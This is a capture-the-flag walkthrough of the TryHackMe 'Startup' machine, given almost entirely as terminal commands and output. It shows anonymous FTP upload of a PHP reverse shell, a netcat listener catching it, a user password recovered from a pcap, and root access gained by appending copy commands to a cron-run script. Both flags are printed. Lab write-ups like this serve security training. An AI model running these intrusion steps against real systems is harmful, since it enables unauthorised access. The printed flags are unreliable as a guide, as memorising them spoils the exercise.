Star Up machine writeup 

└─$ nmap -sV -F 10.48.183.172
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org/) ) at 2026-02-19 19:39 +0530
Nmap scan report for 10.48.183.172
Host is up (0.060s latency).
Not shown: 97 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds

─$ gobuster dir -u [http://10.48.183.172](http://10.48.183.172/) -w /usr/share/wordlists/dirb/common.txt
files                (Status: 301) [Size: 314] [--> http://10.48.183.172/files/]

─(kali㉿kali)-[~/TryHackMe/Startup]
└─$ nmap -sV -sC -p 21 10.48.183.172
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org/) ) at 2026-02-19 19:51 +0530
Nmap scan report for 10.48.183.172
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.205.29
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.35 seconds

┌──(kali㉿kali)-[~/TryHackMe/Startup]
└─$ ftp 10.48.183.172

Connected to 10.48.183.172.
220 (vsFTPd 3.0.3)
Name (10.48.183.172:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12396|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> ls
229 Entering Extended Passive Mode (|||6934|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||50496|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> put reshell.php
local: reshell.php remote: reshell.php
229 Entering Extended Passive Mode (|||5199|)
150 Ok to send data.
100% |***********************************************************************|  5496       17.64 MiB/s    00:00 ETA
226 Transfer complete.
5496 bytes sent in 00:00 (38.06 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||16931|)
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118          5496 Feb 19 14:31 reshell.php
226 Directory send OK.
ftp>

now 

nc -lvnp 1234 for connection 

$ ls
bin
boot
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old

cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love

$ cd incidents
$ ls
suspicious.pcapng
$ get suspicious.pcapng
$ python3 -m http.server 8080
in kali machine 

wget 10.48.183.172:8080/suspicious.pcapng  

now analysis the pcap file in wireshark 

wireshark -r suspicious.pcapng 

in fiter - data 

and go to follow tcp strem 

$ whoami
www-data
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/incidents$ su lennie
su lennie
Password: c4ntg3t3n0ughsp1c3
lennie@startup:/incidents$ whoami
whoami
lennie
lennie@startup:/incidents$ cd /home
cd /home
lennie@startup:/home$ ls
ls
lennie
lennie@startup:/home$ cd lennie
cd lennie
lennie@startup:~$ ls
ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

PrivEsc:

cd scripts
cd scripts
lennie@startup:~/scripts$ ls -la
ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 [planner.sh](http://planner.sh/)
-rw-r--r-- 1 root   root      1 Feb 19 17:44 startup_list.txt
lennie@startup:~/scripts$ cat [planner.sh](http://planner.sh/)
cat [planner.sh](http://planner.sh/)
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ ls -la /etc/print.sh
ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
lennie@startup:~/scripts$ echo "cp /root/* /home/lennie; chmod 777 /home/lennie/*" >> /etc/print.sh
<cho "cp /root/* /home/lennie; chmod 777 /home/lennie/*" >> /etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh
cat /etc/print.sh
#!/bin/bash
echo "Done!"
cp /root/* /home/lennie; chmod 777 /home/lennie/*
lennie@startup:~/scripts$ cd /home/lennie
cd /home/lennie
lennie@startup:~$ ls -la
ls -la
total 24
drwx------ 4 lennie lennie 4096 Feb 19 17:50 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwxrwxrwx 2 lennie lennie 4096 Nov 12  2020 Documents
-rwxrwxrwx 1 root   root     38 Feb 19 17:50 root.txt
drwxrwxrwx 2 root   root   4096 Nov 12  2020 scripts
-rwxrwxrwx 1 lennie lennie   38 Nov 12  2020 user.txt
lennie@startup:~$ cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
